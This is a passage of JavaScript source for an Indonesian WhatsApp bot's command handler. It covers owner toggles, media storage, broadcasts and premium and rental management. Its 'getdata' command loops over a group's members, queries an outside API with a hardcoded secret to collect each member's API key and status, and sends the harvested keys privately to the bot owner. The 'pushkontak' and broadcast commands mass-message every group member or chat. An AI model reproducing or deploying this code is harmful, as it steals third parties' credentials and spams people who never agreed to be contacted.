						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'autobio': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (args[0] === "on") {
					if (setting.autobio === true) return m.reply("Udh on")
					setting.autobio = true
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Autobio berhasil diaktifkan")
				} else if (args[0] === "off") {
					if (setting.autobio === false) return m.reply("Udh off")
					setting.autobio = false
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Autobio berhasil dinonaktifkan")
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'prefix': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (args[0] === "on") {
					if (setting.prefix === true) return m.reply("Udh on")
					setting.prefix = true
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Prefix berhasil diaktifkan")
				} else if (args[0] === "off") {
					if (setting.prefix === false) return m.reply("Udh off")
					setting.prefix = false
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Prefix berhasil dinonaktifkan")
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'gconly':
			case 'gruponly': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (args[0] === "on") {
					if (setting.gruponly === true) return m.reply("Udh on")
					setting.gruponly = true
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					setting.pconly = false
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Gruponly berhasil diaktifkan")
				} else if (args[0] === "off") {
					if (setting.gruponly === false) return m.reply("Udh off")
					setting.gruponly = false
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Gruponly berhasil dinonaktifkan")
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'pconly': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (args[0] === "on") {
					if (setting.pconly === true) return m.reply("Udh on")
					setting.pconly = true
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					setting.gruponly = false
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("PConly berhasil diaktifkan")
				} else if (args[0] === "off") {
					if (setting.pconly === false) return m.reply("Udh off")
					setting.pconly = false
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("PConly berhasil dinonaktifkan")
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'autobackup': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (args[0] === "on") {
					if (setting.autobackup === true) return m.reply("Udh on")
					setting.autobackup = true
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Autobackup berhasil diaktifkan")
				} else if (args[0] === "off") {
					if (setting.autobackup === false) return m.reply("Udh off")
					setting.autobackup = false
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Autobackup berhasil dinonaktifkan")
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'anticall': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (args[0] === "on") {
					if (setting.anticall === true) return m.reply("Udh on")
					setting.anticall = true
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Anticall berhasil diaktifkan")
				} else if (args[0] === "off") {
					if (setting.anticall === false) return m.reply("Udh off")
					setting.anticall = false
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Anticall berhasil dinonaktifkan")
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'autorespond': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (args[0] === "on") {
					if (setting.autorespond === true) return m.reply("Udh on")
					setting.autorespond = true
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Autorespond berhasil diaktifkan")
				} else if (args[0] === "off") {
					if (setting.autorespond === false) return m.reply("Udh off")
					setting.autorespond = false
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Autorespond berhasil dinonaktifkan")
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'autoblok':
			case 'autoblok212': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (args[0] === "on") {
					if (setting.autoblok212 === true) return m.reply("Udh on")
					setting.autoblok212 = true
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Autoblok berhasil diaktifkan")
				} else if (args[0] === "off") {
					if (setting.autoblok212 === false) return m.reply("Udh off")
					setting.autoblok212 = false
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Autoblok berhasil dinonaktifkan")
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'onlyregister':
			case 'onlyregis':
			case 'registeronly': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (args[0] === "on") {
					if (setting.onlyRegister === true) return m.reply("Udh on")
					setting.onlyRegister = true
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("onlyRegister berhasil diaktifkan")
				} else if (args[0] === "off") {
					if (setting.onlyRegister === false) return m.reply("Udh off")
					setting.onlyRegister = false
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("onlyRegister berhasil dinonaktifkan")
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'regisnotif':
			case 'notifregis':
			case 'registernotif':
			case 'notifregister': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (args[0] === "on") {
					if (setting.notifRegister === true) return m.reply("Udh on")
					setting.notifRegister = true
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("notifRegister berhasil diaktifkan")
				} else if (args[0] === "off") {
					if (setting.notifRegister === false) return m.reply("Udh off")
					setting.notifRegister = false
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("notifRegister berhasil dinonaktifkan")
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'autoread': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (args[0] === "on") {
					if (setting.autoread === true) return m.reply("Udh on")
					setting.autoread = true
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Autoread berhasil diaktifkan")
				} else if (args[0] === "off") {
					if (setting.autoread === false) return m.reply("Udh off")
					setting.autoread = false
					fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
					m.reply("Autoread berhasil dinonaktifkan")
				} else {
					let button = [{
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"on\",\"id\":\".${command} on\"}`
					}, {
						"name": "quick_reply",
						"buttonParamsJson": `{\"display_text\":\"off\",\"id\":\".${command} off\"}`
					}]
					vreden.sendButtonText(m.chat, button, `*Memasuki ${command} mode*\non -- _mengaktifkan_\noff -- _Menonaktifkan_`, footer, m)
				}
			}
			break
			case 'addstiker':
			case 'addsticker':
			case 'addstik': {
				if (!m.key.fromMe && !isCreator) return m.tolak(mess.OnlyOwner)
				if (!/webp/.test(mime)) return m.warning(`Contoh:\n${prefix + command} halo`)
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
				if (text.includes('|')) return m.warning(`Contoh:\n${prefix + command} halo`)
				let media = await vreden.downloadMediaMessage(quoted)
				setiker.push(`${text}`)
				fs.writeFileSync(`./database/${text}.webp`, media)
				fs.writeFileSync('./database/stik.json', JSON.stringify(setiker))
				m.reply(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
			}
			break
			case 'delstiker':
			case 'delsticker':
			case 'delstik': {
				if (!m.key.fromMe && !isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
				if (!setiker.includes(text)) return m.warning(`Sticker dengan nama ${text} tidak ditemukan!`)
				
				try {
					fs.unlinkSync(`./database/${text}.webp`)
				} catch (err) {
					return m.warning(`Terjadi kesalahan saat menghapus file sticker ${text}.webp`)
				}

				setiker = setiker.filter(stik => stik !== text)
				fs.writeFileSync('./database/stik.json', JSON.stringify(setiker))

				m.reply(`Sukses Menghapus Sticker ${text}\nCek dengan cara ${prefix}liststik`)
			}
			break
			case 'liststik':
			case 'liststiker':
			case 'liststc': {
				teks = '*STICKER LIST :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*\n\n_Untuk mengambil sticker silahkan kirim pesan sesuai list stiker di atas_`
				m.reply(teks)
				break
			}
			case 'addfoto':
			case 'addimage':
			case 'addphoto':
			case 'addimg': {
				if (!m.key.fromMe && !isCreator) return m.tolak(mess.OnlyOwner)
				if (!/image/.test(mime)) return m.warning(`Contoh:\n${prefix + command} halo`)
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
				if (text.includes('|')) return m.warning(`Contoh:\n${prefix + command} halo`)
				let media = await vreden.downloadMediaMessage(quoted)
				imagenye.push(`${text}`)
				fs.writeFileSync(`./database/${text}.jpg`, media)
				fs.writeFileSync('./database/image.json', JSON.stringify(imagenye))
				m.reply(`Sukses Menambahkan Image\nCek dengan cara ${prefix}listimg`)
			}
			break
			case 'savefile': {
				if (!m.key.fromMe && !isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} ./lib/scraper.js`)
				if (!text.includes("./")) return m.warning(`*• Contoh* : ${prefix + command} ./package.json`)
				if (text.includes('|')) return m.warning(`Contoh:\n${prefix + command} ./lib/scraper.js`)
				if (!quoted) return m.warning('Mana File nya?')
				let media = await vreden.downloadMediaMessage(quoted)
				fs.writeFileSync(`${text}`, media)
				m.reply(`Sukses Menambahkan file\nCek dengan cara $ ls`)
			}
			break
			case 'delfoto':
			case 'delimage':
			case 'delphoto':
			case 'delimg': {
				if (!m.key.fromMe && !isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
				if (!imagenye.includes(text)) return m.warning(`Image dengan nama ${text} tidak ditemukan!`)
				try {
					fs.unlinkSync(`./database/${text}.jpg`)
				} catch (err) {
					return m.warning(`Terjadi kesalahan saat menghapus file image ${text}.jpg`)
				}
				imagenye = imagenye.filter(img => img !== text)
				fs.writeFileSync('./database/image.json', JSON.stringify(imagenye))

				m.reply(`Sukses Menghapus Image ${text}\nCek dengan cara ${prefix}listimg`)
			}
			break
			case 'listimage':
			case 'imagelist':
			case 'listimg': {
				teks = '*IMAGE LIST :*\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${imagenye.length}*\n\n_Untuk mengambil image silahkan kirim pesan sesuai list image di atas_`
				m.reply(teks)
				break
			}
			case 'addvideo':
			case 'addvidio':
			case 'addvid': {
				if (!m.key.fromMe && !isCreator) return m.tolak(mess.OnlyOwner)
				if (!/video/.test(mime)) return m.warning(`Contoh:\n${prefix + command} halo`)
				if ((quoted.msg || quoted).seconds > 31) return m.warning('Maksimal 30 detik')
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
				if (text.includes('|')) return m.warning(`Contoh:\n${prefix + command} halo`)
				let media = await vreden.downloadMediaMessage(quoted)
				videonye.push(`${text}`)
				fs.writeFileSync(`./database/${text}.mp4`, media)
				fs.writeFileSync('./database/video.json', JSON.stringify(videonye))
				m.reply(`Sukses Menambahkan Video\nCek dengan cara ${prefix}listvid`)
			}
			break
			case 'delvideo':
			case 'delvid': {
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
				if (!videonye.includes(text)) return m.sendForward('Video tersebut tidak ada!')
				let anu = videonye.indexOf(text)
				videonye.splice(anu, 1)
				fs.writeFileSync('./database/video.json', JSON.stringify(videonye))
				fs.unlinkSync(`./database/${text}.mp4`)
				m.sendForward('Berhasil Dihapus')
			}
			break
			case 'videolist':
			case 'listvidio':
			case 'listvid':
			case 'listvideo': {
				teks = '*VIDEO LIST :*\n\n'
				for (let awokwkwk of videonye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${videonye.length}*\n\n_Untuk mengambil video silahkan kirim pesan sesuai list video di atas_`
				m.reply(teks)
				break
			}
			case 'addaud':
			case 'addaudio':
			case 'addvn': {
				if (!m.key.fromMe && !isCreator) return m.tolak(mess.OnlyOwner)
				if (!/audio/.test(mime)) return m.warning(`Contoh:\n${prefix + command} halo`)
				if ((quoted.msg || quoted).seconds > 31) return m.warning('Maksimal 30 detik')
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
				if (text.includes('|')) return m.warning(`Contoh:\n${prefix + command} halo`)
				let media = await vreden.downloadMediaMessage(quoted)
				audionye.push(`${text}`)
				fs.writeFileSync(`./database/${text}.mp3`, media)
				fs.writeFileSync('./database/vn.json', JSON.stringify(audionye))
				m.reply(`Sukses Menambahkan Vn / audio \nCek dengan cara ${prefix}listvn`)
			}
			break
			case 'delvn':
			case 'delaudio':
			case 'delaud': {
				if (!text) return m.warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} halo`)
				if (!audionye.includes(text)) return m.sendForward('Vn tersebut tidak ada!')
				let anu = audionye.indexOf(text)
				audionye.splice(anu, 1)
				fs.writeFileSync('./database/vn.json', JSON.stringify(audionye))
				fs.unlinkSync(`./database/${text}.mp3`)
				m.sendForward('Berhasil Dihapus')
			}
			break
			case 'listvn':
			case 'listaudio': {
				teks = '*AUDIO LIST :*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${audionye.length}*\n\n_Untuk mengambil audio silahkan kirim pesan sesuai list audio di atas_`
				m.reply(teks)
				break
			}
			case 'bcimage':
			case 'bcimg': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`Reply foto dengan caption ${prefix + command} Tes`)
				if (!/image/.test(mime)) return m.warning(`Reply foto dengan caption ${prefix + command} Tes`)
				let anu = await store.chats.all().map(v => v.id)
				let media = await vreden.downloadAndSaveMediaMessage(quoted)
				let buffer = fs.readFileSync(media)
				for (let apaan of anu) {
					let txt = `「 BROADCAST 」\n\n${text}`
					vreden.sendMessage(apaan, {
						image: buffer,
						caption: txt
					}, {
						quoted: fchannel
					})
				}
				m.reply('Sukses Broadcast')
			}
			break
			case 'bcvideo':
			case 'bcvid': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`Reply video dengan caption ${prefix + command} Tes`)
				if (!/video/.test(mime)) return m.warning(`Reply video dengan caption ${prefix + command} Tes`)
				let anu = await store.chats.all().map(v => v.id)
				let media = await vreden.downloadAndSaveMediaMessage(quoted)
				let buffer = fs.readFileSync(media)
				for (let apaan of anu) {
					let txt = `「 BROADCAST 」\n\n${text}`
					vreden.sendMessage(apaan, {
						video: buffer,
						caption: txt,
						mimetype: 'video/mp4',
						duration: 909090909
					}, {
						quoted: fchannel
					})
				}
				m.reply('Sukses Broadcast')
			}
			break
			case 'bcaudio':
			case 'bcaud': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!/audio/.test(mime)) return m.warning(`Reply audio dengan caption ${prefix + command} Tes`)
				let anu = await store.chats.all().map(v => v.id)
				let media = await vreden.downloadAndSaveMediaMessage(quoted)
				let buffer = fs.readFileSync(media)
				for (let apaan of anu) {
					vreden.sendMessage(apaan, {
						audio: buffer,
						mimetype: 'audio/mpeg',
						ptt: false,
						duration: 909090909
					}, {
						quoted: fchannel
					})
				}
				m.reply('Sukses Broadcast')
			}
			break
			case 'bcvn': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!/audio/.test(mime)) return m.warning(`Reply audio dengan caption ${prefix + command} Tes`)
				let anu = await store.chats.all().map(v => v.id)
				let media = await vreden.downloadAndSaveMediaMessage(quoted)
				let buffer = fs.readFileSync(media)
				for (let apaan of anu) {
					vreden.sendMessage(apaan, {
						audio: buffer,
						mimetype: 'audio/mpeg',
						ptt: true,
						duration: 909090909
					}, {
						quoted: fchannel
					})
				}
				m.reply('Sukses Broadcast')
			}
			break
			case 'bcstiker':
			case 'bcstik':
			case 'bcsticker': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!/webp/.test(mime)) return m.warning(`Reply stiker dengan caption ${prefix + command}`)
				let anu = await store.chats.all().map(v => v.id)
				let media = await vreden.downloadAndSaveMediaMessage(quoted)
				let buffer = fs.readFileSync(media)
				for (let apaan of anu) {
					vreden.sendMessage(apaan, {
						sticker: {
							url: media
						}
					}, {
						quoted: fchannel
					})
				}
				m.reply('Sukses Broadcast')
			}
			break
			case 'bc':
			case 'broadcast': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`Contoh:\n${prefix + command} Tes`)
				let anu = await store.chats.all().map(v => v.id)
				let todd = await vreden.reSize(`${setting.pathimg}`, 300, 300)
				m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 5} detik`)
				let button = [{
					"name": "cta_url",
					"buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}\"}`
				}]
				for (let xnxx of anu) {
					await sleep(5000)
					if (/image/.test(mime)) {
						media = await quoted.download()
						vreden.sendButtonImage(xnxx, media, button, `*｢ BOARDCAST ｣*\n\n${text}\n`, footer, fhalo)
					} else if (/video/.test(mime)) {
						media = await quoted.download()
						vreden.sendButtonVideo(xnxx, media, button, `*｢ BOARDCAST ｣*\n\n${text}\n`, footer, fhalo)
					} else {
						vreden.sendButtonText(xnxx, button, `*｢ BOARDCAST ｣*\n\n${text}\n`, footer, fhalo)
					}
				}
				m.reply("*Sukses Boardcast All Chat ✅*")
			}
			break
			case 'bcgc': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group`)
				let getGroups = await vreden.groupFetchAllParticipating()
				let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
				let anu = groups.map((v) => v.id)
				m.reply(`Mengirim Broadcast Ke ${anu.length} Group\nWaktu Selesai ${anu.length * 5} detik`)
				let button = [{
					"name": "cta_url",
					"buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}\",\"merchant_url\":\"https://api.whatsapp.com/send/?phone=${nomorOwner.split("@")[0]}\"}`
				}]
				for (let xnxx of anu) {
					await sleep(5000)
					if (/image/.test(mime)) {
						media = await quoted.download()
						vreden.sendButtonImage(xnxx, media, button, `*｢ BOARDCAST GRUP ｣*\n\n${text}\n`, footer, fhalo)
					} else if (/video/.test(mime)) {
						media = await quoted.download()
						vreden.sendButtonVideo(xnxx, media, button, `*｢ BOARDCAST GRUP ｣*\n\n${text}\n`, footer, fhalo)
					} else {
						vreden.sendButtonText(xnxx, button, `*｢ BOARDCAST GRUP ｣*\n\n${text}\n`, footer, fhalo)
					}
				}
				m.reply("*Sukses Boardcast Grup ✅*")
			}
			break
			case 'pushkontak': {
				if (!isCreator) return m.tolak('*Khusus Owner Bot*')
				if (!m.isGroup) return m.warning('Hanya bisa digunakan di dalam grup')
				var name = text.split('|')[0]
				var chet = text.split('|')[1]
				if (!name) return m.warning(`Masukan nama lu yang bener cok\n contoh: ${prefix+command} vreden|sv uy udh gw sv back`)
				if (!chet) return m.warning(`Masukan nama lu yang bener cok\n contoh: ${prefix+command} vreden|sv uy udh gw sv back`)
				let kontk = {
					displayName: "Contact",
					contacts: [{
						displayName: name,
						vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;" + name + ";;;\nFN:" + name + "\nitem1.TEL;waid=" + m.sender.split('@')[0] + ":" + m.sender.split('@')[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
					}]
				}
				let pkDetect = await vreden.groupMetadata(m.chat)
				if (pkDetect.participants.length > 200) return m.warning('Batas member maksimal; 200')
				m.reply('Gasken pushkontak total member ' + pkDetect.participants.length + ' member')
				for (let a of pkDetect.participants) {
					vreden.sendMessage(a.id, {
						contacts: kontk
					})
					await sleep(500)
					vreden.sendMessage(a.id, {
						text: chet,
						contextInfo: {
							"externalAdReply": {
								"title": botName,
								"body": `Ijin Pushkontak Om`,
								previewType: "PHOTO",
								showAdAttribution: true,
								sourceUrl: instagram,
								thumbnailUrl: pathimg,
							}
						}
					})
					await sleep(500)
				} // (?); kirim pesan ke semua peserta grup
				m.reply('Group: *' + pkDetect.subject + '*\nMember: ' + pkDetect.participants.length + '\ndelay: 500\nBERHASIL PUSH')
			}
			break
			case 'getdata': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!m.isGroup) return m.warning(`Perintah ini hanya bisa dilakukan di Grup yang menyewa bot`)
				m.sendForward("Started...")
				let pkDetect = await vreden.groupMetadata(m.chat)
				let teks = "*DATA USER SKIZO*\n\n"
				const cardkey = []
				for (let a of pkDetect.participants) {
					await sleep(2000)
					let api = await fetchJson(`https://skizo.tech/api/checkapikey?phone=${a.id}&secret=bejo112`)
					if (api.status === 200) {
						cardkey.push({
							apikey: api.apikey,
							status: api.role,
							banned: api.banned,
							id: a.id
						})
					} else {
						console.log("nothing")
					}
				}
				for (let i of cardkey) {
					teks += `*Apikey:* ${i.apikey}
*Status:* ${i.status}
*Banned:* ${i.banned}
*Nombor:* ${i.id.split("@")[0]}

`
				}
				m.sendForward(`*${cardkey.length}* Dari *${pkDetect.participants.length}* Pernah Terdaftar Api\n\n_Data Dikirim Ke Private Chat_`)
				await vreden.sendText(nomorOwner, teks, fbot)
			}
			break
			case 'delchat':
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				var teks = q ? q : m.chat
				await vreden.chatModify({
					delete: true,
					lastMessages: [{
						key: m.key,
						messageTimestamp: m.messageTimestamp
					}]
				}, teks)
				m.reply('Sukses!')
				break
			case 'bcsewa': {
				let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!text) return m.warning(`Contoh:\n${prefix + command} Tes`)
				for (let i of sewa) {
					await vreden.sendMessage(i.id, {
						text: text
					})
					await sleep(3000)
				}
				m.reply(`Sukses bc ke ${sewa.length}`)
			}
			break
			case 'addprem': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				const kata = args.join(" ")
				const nomor = kata.split("|")[0];
				const hari = kata.split("|")[1];
				if (!nomor) return m.warning(`Penggunaan :\n*${prefix}addprem* @tag|waktu\n*${prefix}addprem* nomor|waktu\n\nContoh : ${prefix+command} @tag|30d`)
				if (!hari) return m.warning(`Mau yang berapa hari?`)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (ownerNumber.includes(users)) return m.warning('Tidak Dapat Melakukannya Kepada Owner')
				const idExists = _prem.checkPremiumUser(users)
				if (idExists) return m.reply("*User sudah premium!*")
				let data = await vreden.onWhatsApp(users)
				if (data[0].exists) {
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
					_prem.addPremiumUser(users, hari)
					await sleep(3000)
					let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
					let teks = `*</> VIP USER REGIS </>*

*Subscribe Info* :
- User : @${users.split("@")[0]}
- Expired : ${hari.toUpperCase()}
- Countdown :
${cekvip.days} hari, ${cekvip.hours} jam, ${cekvip.minutes} menit

*Benefit Info* :
- Download : 90MB++
- Limit : Unlimited
- Request : 10/s
- VIP Access : Yes
- User Priority : Yes
`
            		const contentText = {
            			text: teks,
            			contextInfo: {
            				mentionedJid: vreden.ments(teks),
            				externalAdReply: {
        					title: `PREMIUM USER 💳`,
        					previewType: "PHOTO",
        					thumbnailUrl: `https://pomf2.lain.la/f/dynqtljb.jpg`,
        					sourceUrl: setting.tiktok
            				}
            			}
            		};
            		return vreden.sendMessage(m.chat, contentText, {
                    			quoted: m,
                    		});
				} else {
					m.reply("Nomor tidak terdaftar di wangsaf")
				}
			}
			break
			case 'delprem': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!args[0]) return m.warning(`Penggunaan :\n*${prefix}delprem* @tag\n*${prefix}delprem* nomor`)
				let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				const idExists = _prem.checkPremiumUser(users)
				if (!idExists) return m.reply("*User belum premium!*")
				let data = await vreden.onWhatsApp(users)
				if (data[0].exists) {
					let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
					premium.splice(_prem.getPremiumPosition(users), 1)
					fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
					m.reply('User dihapus dari premium!')
				} else {
					m.reply("Nomor tidak terdaftar di wangsaf")
				}
				}
				break
			case 'addsewa': {
				if (!isCreator) return m.tolak(mess.OnlyOwner)
				if (!args[0]) return m.warning(`*Masukan link dan time!*\n\nContoh :\n${prefix+command} linkgrup 30d\n\n`)
				if (!isUrl(args[0])) return m.warning(mess.error.Iv)
				if (!args[1]) return m.warning(`*Masukan time sewa!*\n\nContoh :\n${prefix+command} linkgrup 30d\n\n`)
				var url = args[0]
				url = url.split('https://chat.whatsapp.com/')[1]
				let inspect = await vreden.groupGetInviteInfo(url)
				let data
				let waktu
				let grupJoin = (await vreden.groupFetchAllParticipating())[inspect.id]
				if (!grupJoin) {
				data = await vreden.groupAcceptInvite(url)
				waktu = args[1]
				} else {
				data = inspect.id
				waktu = args[1]
				}
				if (!data) return m.reply("Invalid link atau grup private")
				if (_sewa.checkSewaGroup(data)) return m.warning(`Bot sudah disewa oleh grup tersebut!`)
				_sewa.addSewaGroup(data, waktu)
